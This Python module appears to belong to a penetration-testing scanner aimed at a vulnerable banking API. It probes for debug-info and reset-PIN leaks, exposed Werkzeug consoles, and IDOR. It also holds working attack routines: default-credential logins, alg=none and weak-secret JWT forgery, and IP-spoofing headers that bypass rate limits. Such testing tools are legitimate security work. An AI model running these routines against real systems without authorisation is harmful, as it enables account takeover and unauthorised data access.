"""api_version_tester.py — Tests legacy API versions and detects debug info leakage.

Covers:
- Password reset endpoints that expose the PIN/OTP in the response body (debug_info)
- Legacy API versions (v1/v2) that expose information removed from modern versions
- Unauthenticated API documentation endpoints (Swagger/OpenAPI)
- Werkzeug / Flask debugger console exposure
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import List, Dict, Optional

log = logging.getLogger("oneinfinity.api_version_tester")

# Patterns indicating debug info leakage in API responses
_DEBUG_LEAK_PATTERNS = [
    (re.compile(r'"pin"\s*:\s*"?\d{3,8}"?', re.I), "password_reset_pin_exposed"),
    (re.compile(r'"reset_pin"\s*:\s*"?\d{3,8}"?', re.I), "password_reset_pin_exposed"),
    (re.compile(r'"reset_code"\s*:\s*"?\d{3,8}"?', re.I), "password_reset_pin_exposed"),
    (re.compile(r'"otp"\s*:\s*"?\d{4,8}"?', re.I), "otp_exposed"),
    (re.compile(r'"debug_info"\s*:\s*\{', re.I), "debug_info_object_exposed"),
    (re.compile(r'"traceback"\s*:\s*"', re.I), "traceback_exposed"),
    (re.compile(r'"internal_token"\s*:\s*"[^"]{6,}"', re.I), "internal_token_exposed"),
]

# Werkzeug / Flask debugger signatures
_DEBUGGER_PATTERNS = [
    re.compile(r'Werkzeug Debugger', re.I),
    re.compile(r'CONSOLE_MODE\s*=\s*true', re.I),
    re.compile(r'Interactive Console', re.I),
    re.compile(r'EVALEX\s*=\s*true', re.I),
]

# Password reset endpoint path variants to probe
_PASSWORD_RESET_PATHS = [
    "/forgot-password",
    "/reset-password",
    "/password-reset",
    "/api/forgot-password",
    "/api/reset",
    "/api/v1/forgot-password",
    "/api/v2/forgot-password",
    "/api/v3/forgot-password",
    "/api/v1/reset-password",
    "/api/v2/reset-password",
    "/auth/forgot-password",
    "/user/forgot-password",
    "/users/forgot-password",
    "/account/forgot-password",
]

# High-value unlinked endpoints to probe (not found by crawlers)
_HIGH_VALUE_PATHS = [
    "/console",
    "/debug",
    "/shell",
    "/terminal",
    "/admin",
    "/admin/",
    "/swagger",
    "/swagger-ui.html",
    "/swagger-ui/",
    "/api/docs",
    "/api/docs/",
    "/api/swagger",
    "/openapi.json",
    "/swagger.json",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/info",
    "/phpmyadmin",
    "/adminer.php",
    "/server-status",
    "/server-info",
    "/.env",
    "/.git/HEAD",
    "/config.json",
    "/robots.txt",
    "/sitemap.xml",
    "/trace",
    "/metrics",
    "/health",
    "/healthz",
]


def _probe(url: str, method: str = "POST", data: dict | None = None,
           timeout: int = 8) -> tuple[int, bytes, dict]:
    """Send HTTP request. Returns (status_code, body_bytes, headers_dict)."""
    try:
        body = json.dumps(data or {"email": "pentest-probe@test.com"}).encode()
        req = urllib.request.Request(
            url, data=body,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method=method,
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(), dict(e.headers)
        except Exception:
            return e.code, b"", {}
    except Exception:
        return 0, b"", {}


def _get(url: str, timeout: int = 8) -> tuple[int, bytes, dict]:
    """GET request."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(), dict(e.headers)
        except Exception:
            return e.code, b"", {}
    except Exception:
        return 0, b"", {}


def _make_fid(prefix: str, url: str) -> str:
    return hashlib.md5(f"{prefix}:{url}".encode()).hexdigest()[:16]


def test_password_reset_debug_leak(base_url: str) -> List[Dict]:
    """Test password reset endpoints for debug info leakage."""
    findings = []
    base = base_url.rstrip("/")
    for path in _PASSWORD_RESET_PATHS:
        url = f"{base}{path}"
        code, body, _ = _probe(url)
        if code in (200, 201) and body:
            body_str = body.decode("utf-8", errors="ignore")
            for pattern, ptype in _DEBUG_LEAK_PATTERNS:
                m = pattern.search(body_str)
                if m:
                    log.info("DEBUG LEAK at %s [%s]: %s", url, ptype, m.group(0)[:80])
                    findings.append({
                        "vuln_type": "debug_info_disclosure",
                        "type": "debug_info_disclosure",
                        "tool": "api_version_tester",
                        "severity": "critical",
                        "confidence": 0.95,
                        "source_type": "active",
                        "url": url,
                        "finding_id": _make_fid("debug_leak", url),
                        "title": f"Debug info leaked in password reset response: {path}",
                        "evidence": (
                            f"HTTP {code}: {m.group(0)[:200]}  "
                            f"| Full excerpt: {body_str[:400]}"
                        ),
                        "payload": '{"email": "pentest-probe@test.com"}',
                    })
                    break  # one finding per endpoint
    return findings


def test_werkzeug_debugger(base_url: str) -> List[Dict]:
    """Probe /console and similar paths for Werkzeug interactive debugger exposure."""
    findings = []
    base = base_url.rstrip("/")
    for path in ("/console", "/debug", "/shell"):
        url = f"{base}{path}"
        code, body, _ = _get(url)
        if code == 200 and body:
            body_str = body.decode("utf-8", errors="ignore")
            for pat in _DEBUGGER_PATTERNS:
                if pat.search(body_str):
                    log.info("WERKZEUG DEBUGGER at %s", url)
                    findings.append({
                        "vuln_type": "werkzeug_debugger",
                        "type": "werkzeug_debugger",
                        "tool": "api_version_tester",
                        "severity": "critical",
                        "confidence": 0.95,
                        "source_type": "active",
                        "url": url,
                        "finding_id": _make_fid("werkzeug", url),
                        "title": f"Werkzeug interactive debugger exposed at {path}",
                        "evidence": (
                            "Werkzeug Debugger UI accessible without authentication. "
                            "Allows arbitrary Python code execution if PIN can be obtained."
                        ),
                        "payload": "",
                    })
                    break
    return findings


def test_unauthenticated_api_docs(base_url: str) -> List[Dict]:
    """Check if API documentation is publicly accessible without authentication."""
    findings = []
    base = base_url.rstrip("/")
    _doc_paths = ["/api/docs", "/api/docs/", "/swagger", "/swagger-ui.html", "/openapi.json", "/swagger.json"]
    for path in _doc_paths:
        url = f"{base}{path}"
        code, body, _ = _get(url)
        if code == 200 and body and len(body) > 200:
            body_str = body.decode("utf-8", errors="ignore")
            if any(kw in body_str.lower() for kw in ["swagger", "openapi", "api docs", "paths", "endpoints"]):
                log.info("UNAUTHENTICATED API DOCS at %s", url)
                findings.append({
                    "vuln_type": "unauthenticated_access",
                    "type": "unauthenticated_access",
                    "tool": "api_version_tester",
                    "severity": "medium",
                    "confidence": 0.80,
                    "source_type": "active",
                    "url": url,
                    "finding_id": _make_fid("api_docs", url),
                    "title": f"API documentation publicly accessible without authentication: {path}",
                    "evidence": f"HTTP {code}: API docs exposed at {url}",
                    "payload": "",
                })
                break  # one finding is enough
    return findings


def test_api_version_downgrade(base_url: str, discovered_paths: List[str]) -> List[Dict]:
    """For each versioned endpoint (v3/v4), test older versions for legacy vulnerability."""
    findings = []
    base = base_url.rstrip("/")
    versioned = set()
    for path in discovered_paths:
        m = re.search(r'/v(\d+)/', path)
        if m and int(m.group(1)) > 1:
            versioned.add(path)

    for path in versioned:
        current_ver_m = re.search(r'/v(\d+)/', path)
        if not current_ver_m:
            continue
        current_ver = int(current_ver_m.group(1))
        for ver in range(1, current_ver):
            legacy_path = re.sub(r'/v\d+/', f'/v{ver}/', path)
            url = f"{base}{legacy_path}"
            code, body, _ = _probe(url)
            if code in (200, 201) and body:
                body_str = body.decode("utf-8", errors="ignore")
                for pattern, ptype in _DEBUG_LEAK_PATTERNS:
                    m2 = pattern.search(body_str)
                    if m2:
                        log.info("API VERSION DOWNGRADE at %s: %s", url, m2.group(0)[:80])
                        findings.append({
                            "vuln_type": "api_version_downgrade",
                            "tool": "api_version_tester",
                            "severity": "high",
                            "confidence": 0.90,
                            "source_type": "active",
                            "url": url,
                            "finding_id": _make_fid("ver_downgrade", url),
                            "title": f"Legacy API v{ver} exposes sensitive data not present in v{current_ver}: {legacy_path}",
                            "evidence": f"HTTP {code}: {m2.group(0)[:200]}",
                            "payload": '{"email": "pentest-probe@test.com"}',
                        })
    return findings


# ── Known default credentials for banking app testing ──────────────────────────
_DEFAULT_CREDS = [
    ("admin", "admin123"), ("admin", "Admin123!"), ("admin", "password"),
    ("merchant@bank.com", "admin123"), ("admin@vulnbank.org", "admin123"),
]

# ── Endpoints where credentials are tried for JWT extraction ────────────────────
_AUTH_ENDPOINTS = [
    "/api/v1/merchants/login", "/api/v1/auth/login", "/api/login",
    "/api/v1/login", "/auth/login", "/api/auth/login",
]


def _get_auth_token(base_url: str) -> Optional[str]:
    """Attempt login with known default credentials; return JWT/token string or None."""
    base = base_url.rstrip("/")
    for path in _AUTH_ENDPOINTS:
        url = f"{base}{path}"
        for user, pwd in _DEFAULT_CREDS:
            for ct, body_fn in [
                ("application/json", lambda u, p: json.dumps({"username": u, "password": p}).encode()),
                ("application/json", lambda u, p: json.dumps({"email": u, "password": p}).encode()),
                ("application/x-www-form-urlencoded", lambda u, p: urllib.parse.urlencode({"username": u, "password": p}).encode()),
            ]:
                try:
                    req = urllib.request.Request(
                        url, data=body_fn(user, pwd),
                        headers={"Content-Type": ct, "User-Agent": "Mozilla/5.0"},
                        method="POST",
                    )
                    with urllib.request.urlopen(req, timeout=8) as resp:
                        body = resp.read().decode("utf-8", errors="ignore")
                        if resp.status == 200:
                            try:
                                data = json.loads(body)
                                token = (data.get("token") or data.get("access_token") or
                                         data.get("jwt") or data.get("auth_token") or "")
                                if token:
                                    log.info("_get_auth_token: obtained JWT via %s", path)
                                    return token
                            except Exception:
                                pass
                except Exception:
                    continue
    return None


def test_jwt_bypass(base_url: str) -> List[Dict]:
    """Test JWT alg=none and weak-secret bypass after obtaining a valid token.

    Gap 6: jwt_none_alg + jwt_weak_secret — no other scanner does self-contained auth→test→bypass.
    """
    findings: List[Dict] = []
    base = base_url.rstrip("/")

    token = _get_auth_token(base)
    if not token:
        log.debug("test_jwt_bypass: no token obtained, skipping")
        return findings

    # Decode JWT header.payload (don't verify — we're testing the server's laxity)
    parts = token.split(".")
    if len(parts) != 3:
        return findings

    # Test 1: alg=none (strip signature)
    try:
        header_b64 = parts[0]
        payload_b64 = parts[1]
        # Decode with padding
        pad = lambda s: s + "=" * (-len(s) % 4)
        header_json = json.loads(base64.b64decode(pad(header_b64)).decode())
        header_json["alg"] = "none"
        none_header = base64.b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
        none_token = f"{none_header}.{payload_b64}."  # empty signature

        # Try on a protected endpoint
        for ep in ["/api/v1/merchants/profile", "/api/v1/merchants/dashboard", "/api/v1/users/me"]:
            url = f"{base}{ep}"
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Authorization": f"Bearer {none_token}", "User-Agent": "Mozilla/5.0"},
                )
                with urllib.request.urlopen(req, timeout=8) as resp:
                    if resp.status == 200:
                        body = resp.read().decode("utf-8", errors="ignore")
                        if body and len(body) > 20:
                            log.info("JWT ALG=NONE BYPASS at %s", url)
                            findings.append({
                                "vuln_type": "jwt_none_alg", "type": "jwt_none_alg",
                                "severity": "critical", "confidence": 0.95,
                                "source_type": "active",
                                "url": url,
                                "title": "JWT None Algorithm Bypass — server accepts unsigned token",
                                "evidence": f"HTTP 200 with alg=none token: {body[:200]}",
                                "payload": none_token[:80] + "…",
                                "finding_id": _make_fid("jwt_none", url),
                            })
                            break
            except Exception:
                continue
    except Exception as e:
        log.debug("test_jwt_bypass alg=none: %s", e)

    # Test 2: Weak secret (HS256 with "secret123")
    try:
        import hmac, hashlib as _hs
        header_json2 = json.loads(base64.b64decode(pad(parts[0])).decode())
        if header_json2.get("alg", "").upper().startswith("HS"):
            header_b64_orig = base64.b64encode(json.dumps(header_json2).encode()).decode().rstrip("=")
            signing_input = f"{header_b64_orig}.{parts[1]}"
            for secret in ["secret123", "secret", "jwt_secret", "password", "admin123"]:
                sig = hmac.new(secret.encode(), signing_input.encode(), _hs.sha256).digest()
                weak_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
                weak_token = f"{signing_input}.{weak_sig}"
                for ep in ["/api/v1/merchants/profile", "/api/v1/merchants/dashboard"]:
                    url = f"{base}{ep}"
                    try:
                        req = urllib.request.Request(
                            url,
                            headers={"Authorization": f"Bearer {weak_token}", "User-Agent": "Mozilla/5.0"},
                        )
                        with urllib.request.urlopen(req, timeout=8) as resp:
                            if resp.status == 200:
                                body = resp.read().decode("utf-8", errors="ignore")
                                if body and len(body) > 20:
                                    log.info("JWT WEAK SECRET '%s' accepted at %s", secret, url)
                                    findings.append({
                                        "vuln_type": "jwt_weak_secret", "type": "jwt_weak_secret",
                                        "severity": "critical", "confidence": 0.90,
                                        "source_type": "active",
                                        "url": url,
                                        "title": f"JWT Weak Secret — server accepts token signed with '{secret}'",
                                        "evidence": f"HTTP 200 re-signed with secret='{secret}': {body[:200]}",
                                        "payload": f"secret={secret}",
                                        "finding_id": _make_fid("jwt_weak", f"{url}:{secret}"),
                                    })
                                    break
                    except Exception:
                        continue
    except Exception as e:
        log.debug("test_jwt_bypass weak-secret: %s", e)

    return findings


def test_session_persistence(base_url: str) -> List[Dict]:
    """Test whether session tokens remain valid after extended inactivity.

    Gap 7: session_never_expires — login, wait 65s, re-probe.
    """
    findings: List[Dict] = []
    base = base_url.rstrip("/")
    token = _get_auth_token(base)
    if not token:
        return findings

    # Wait 65 seconds to test token expiry
    log.info("test_session_persistence: token obtained, sleeping 65s to test expiry…")
    time.sleep(65)

    for ep in ["/api/v1/merchants/profile", "/api/v1/merchants/dashboard", "/api/v1/users/me"]:
        url = f"{base}{ep}"
        try:
            req = urllib.request.Request(
                url,
                headers={"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"},
            )
            with urllib.request.urlopen(req, timeout=8) as resp:
                if resp.status == 200:
                    body = resp.read().decode("utf-8", errors="ignore")
                    if body and len(body) > 20:
                        log.info("SESSION PERSISTENCE: token still valid after 65s at %s", url)
                        findings.append({
                            "vuln_type": "session_never_expires", "type": "session_never_expires",
                            "severity": "medium", "confidence": 0.80,
                            "source_type": "active",
                            "url": url,
                            "title": "Session token never expires — valid after 65s inactivity",
                            "evidence": f"HTTP 200 after 65s with same token: {body[:200]}",
                            "payload": f"Bearer {token[:40]}…",
                            "finding_id": _make_fid("session_persist", url),
                        })
                        break
        except Exception:
            continue
    return findings


def test_unauthenticated_idor(base_url: str) -> List[Dict]:
    """Probe authenticated API endpoints without credentials.

    Gap 8: idor — unauthenticated access to /api/transactions, /api/users, etc.
    """
    findings: List[Dict] = []
    base = base_url.rstrip("/")
    idor_probes = [
        "/api/transactions", "/api/transactions?account_id=1", "/api/transactions?account_id=2",
        "/api/v1/transactions", "/api/v1/transactions?account_id=1",
        "/api/users/1", "/api/users/2", "/api/v1/users/1", "/api/v1/users/2",
        "/api/v1/accounts/1", "/api/v1/accounts/2",
        "/api/v1/merchants/1", "/api/v1/merchants/2",
    ]
    for path in idor_probes:
        url = f"{base}{path}"
        code, body, headers = _get(url)
        if code == 200 and body and len(body) > 10:
            body_str = body.decode("utf-8", errors="ignore")
            # Filter out empty arrays/objects  
            body_stripped = body_str.strip()
            if body_stripped in ("[]", "{}", "null", ""):
                continue
            # Must contain something data-like
            if not any(kw in body_str.lower() for kw in
                       ["id", "user", "account", "email", "transaction", "balance", "amount"]):
                continue
            log.info("UNAUTHENTICATED IDOR at %s (HTTP 200)", url)
            findings.append({
                "vuln_type": "idor", "type": "idor",
                "severity": "high", "confidence": 0.85,
                "source_type": "active",
                "url": url,
                "title": f"IDOR — unauthenticated access to {path}",
                "evidence": f"HTTP 200 without auth token: {body_str[:300]}",
                "payload": path,
                "finding_id": _make_fid("unauth_idor", url),
            })
    return findings


def test_type_confusion(base_url: str) -> List[Dict]:
    """Send type-confused JSON payloads to API endpoints; detect stack traces.

    Gap 9: type_confusion_disclosure — malformed types trigger verbose errors.
    """
    findings: List[Dict] = []
    base = base_url.rstrip("/")
    # Patterns that indicate a stack trace or error disclosure in the response
    _STACK_PATTERNS = [
        re.compile(r"Traceback \(most recent call last\)", re.I),
        re.compile(r"TypeError:|AttributeError:|ValueError:", re.I),
        re.compile(r"File \".*\.py\", line \d+", re.I),
        re.compile(r"Internal Server Error", re.I),
        re.compile(r"Exception in thread", re.I),
        re.compile(r"stack trace:", re.I),
    ]
    confused_payloads = [
        {"username": 12345, "password": None},
        {"username": ["admin"], "password": True},
        {"email": {}, "password": ""},
        {"amount": "abc", "account_id": {}},
        {"user": [None, None], "pass": [1, 2, 3]},
    ]
    endpoints = [
        "/api/login", "/api/v1/merchants/login", "/api/v1/forgot-password",
        "/api/v1/auth/login", "/api/v1/users/register",
    ]
    for ep in endpoints:
        url = f"{base}{ep}"
        for payload in confused_payloads:
            code, body, _ = _probe(url, method="POST", data=payload)
            if code in (500, 400, 422) and body:
                body_str = body.decode("utf-8", errors="ignore")
                for pat in _STACK_PATTERNS:
                    m = pat.search(body_str)
                    if m:
                        log.info("TYPE CONFUSION at %s: %s", url, m.group(0))
                        findings.append({
                            "vuln_type": "type_confusion_disclosure",
                            "type": "type_confusion_disclosure",
                            "severity": "medium", "confidence": 0.85,
                            "source_type": "active",
                            "url": url,
                            "title": f"Type confusion triggers verbose error at {ep}",
                            "evidence": f"HTTP {code}: {body_str[:400]}",
                            "payload": json.dumps(payload),
                            "finding_id": _make_fid("type_confusion", f"{url}:{json.dumps(payload)}"),
                        })
                        break
            # One finding per endpoint is enough
            if any(f["url"] == url for f in findings):
                break
    return findings


# ── Rate-limit bypass header sets ───────────────────────────────────────────
_RATE_LIMIT_BYPASS_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-Addr",
]

# 50 pseudo-random IPs covering public, RFC-1918 mix, and edge values
_BYPASS_IPS = [
    "1.2.3.4", "5.6.7.8", "9.10.11.12", "13.14.15.16", "17.18.19.20",
    "21.22.23.24", "25.26.27.28", "29.30.31.32", "33.34.35.36", "37.38.39.40",
    "41.42.43.44", "45.46.47.48", "49.50.51.52", "53.54.55.56", "57.58.59.60",
    "61.62.63.64", "65.66.67.68", "69.70.71.72", "73.74.75.76", "77.78.79.80",
    "81.82.83.84", "85.86.87.88", "89.90.91.92", "93.94.95.96", "97.98.99.100",
    "101.102.103.104", "105.106.107.108", "109.110.111.112", "113.114.115.116",
    "117.118.119.120", "121.122.123.124", "125.126.127.128", "129.130.131.132",
    "133.134.135.136", "137.138.139.140", "141.142.143.144", "145.146.147.148",
    "149.150.151.152", "153.154.155.156", "157.158.159.160", "161.162.163.164",
    "165.166.167.168", "169.170.171.172", "173.174.175.176", "177.178.179.180",
    "181.182.183.184", "185.186.187.188", "10.0.0.1", "192.168.1.1", "127.0.0.1",
]

# Endpoints typically protected by rate limiting
_RATE_LIMITED_ENDPOINTS = [
    "/api/login",
    "/api/v1/merchants/login",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/login",
    "/auth/login",
    "/api/forgot-password",
    "/api/v1/forgot-password",
]


def rate_limit_bypass_test(base_url: str, n_requests: int = 15) -> List[Dict]:
    """Test rate-limiting controls by rotating IP-spoofing headers.

    For each bypass header (X-Forwarded-For, X-Real-IP, X-Originating-IP,
    X-Remote-Addr) send *n_requests* POST requests in rapid succession using a
    different spoofed IP per request.  If none of those requests receives a
    429/503/locked response the endpoint is considered unprotected.

    vuln_type: rate_limit_bypass_xff  severity: medium
    """
    findings: List[Dict] = []
    base = base_url.rstrip("/")

    # Probe body that resembles a login attempt
    probe_body = {"email": "pentest@rate-bypass.test", "password": "Bypass-Test-1!"}

    for path in _RATE_LIMITED_ENDPOINTS:
        url = f"{base}{path}"

        for header_name in _RATE_LIMIT_BYPASS_HEADERS:
            rate_limited = False
            statuses: List[int] = []

            for ip in _BYPASS_IPS[:n_requests]:
                try:
                    body_bytes = json.dumps(probe_body).encode()
                    req = urllib.request.Request(
                        url,
                        data=body_bytes,
                        headers={
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0",
                            header_name: ip,
                        },
                        method="POST",
                    )
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        statuses.append(resp.status)
                except urllib.error.HTTPError as e:
                    if e.code in (429, 503, 423, 401, 403):
                        rate_limited = True
                        break
                    statuses.append(e.code)
                except Exception:
                    # Network error — treat as inconclusive, skip this IP slot
                    continue

            if rate_limited:
                # Rate limit fired — header NOT bypassed on this endpoint
                continue

            # Any 2xx or 4xx (non-rate-limit) across ≥ n_requests means no RL triggered
            non_rl_responses = [s for s in statuses if s not in (429, 503, 423, 0)]
            if len(non_rl_responses) >= n_requests:
                fid_key = f"{path}:{header_name}"
                log.info(
                    "RATE LIMIT BYPASS via %s at %s (%d/%d requests not rate-limited)",
                    header_name, url, len(non_rl_responses), n_requests,
                )
                findings.append({
                    "vuln_type": "rate_limit_bypass_xff",
                    "type": "rate_limit_bypass_xff",
                    "severity": "medium",
                    "confidence": 0.80,
                    "source_type": "active",
                    "url": url,
                    "title": (
                        f"Rate limit bypassed via {header_name} rotation at {path}"
                    ),
                    "evidence": (
                        f"{len(non_rl_responses)}/{n_requests} requests completed "
                        f"without 429/503 using rotating {header_name} values. "
                        f"Last IPs probed: {', '.join(_BYPASS_IPS[:3])}…"
                    ),
                    "payload": f"{header_name}: <rotating 50 IPs>",
                    "finding_id": _make_fid("rate_limit_bypass", fid_key),
                    "remediation": (
                        f"Rate limiting must be enforced server-side, not solely by "
                        f"client IP derived from {header_name}. Use a backend-side "
                        f"rate limiter keyed on authenticated identity or real TCP IP."
                    ),
                })
                # One finding per header per endpoint is sufficient
                break

    return findings


async def scan_api_versions(target: str, discovered_paths: List[str] | None = None) -> List[Dict]:
    """Main entry: probe target for API version and debug info vulnerabilities."""
    import asyncio
    findings: List[Dict] = []
    loop = asyncio.get_event_loop()

    tasks = [
        loop.run_in_executor(None, test_password_reset_debug_leak, target),
        loop.run_in_executor(None, test_werkzeug_debugger, target),
        loop.run_in_executor(None, test_unauthenticated_api_docs, target),
        # Gap 6: JWT bypass (self-contained auth+tamper)
        loop.run_in_executor(None, test_jwt_bypass, target),
        # Gap 8: IDOR unauthenticated endpoint access
        loop.run_in_executor(None, test_unauthenticated_idor, target),
        # Gap 9: Type confusion / verbose error disclosure
        loop.run_in_executor(None, test_type_confusion, target),
        # Rate limit bypass via IP-spoofing headers (XFF, X-Real-IP, X-Originating-IP, X-Remote-Addr)
        loop.run_in_executor(None, rate_limit_bypass_test, target),
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            findings.extend(r)

    if discovered_paths:
        f2 = await loop.run_in_executor(
            None, test_api_version_downgrade, target, discovered_paths
        )
        findings.extend(f2)

    # Gap 7: session persistence — runs sequentially (needs 65s sleep, avoid blocking gather)
    try:
        sess_findings = await loop.run_in_executor(None, test_session_persistence, target)
        findings.extend(sess_findings)
    except Exception as e:
        log.debug("test_session_persistence failed: %s", e)

    log.info("api_version_tester: %d findings", len(findings))
    return findings
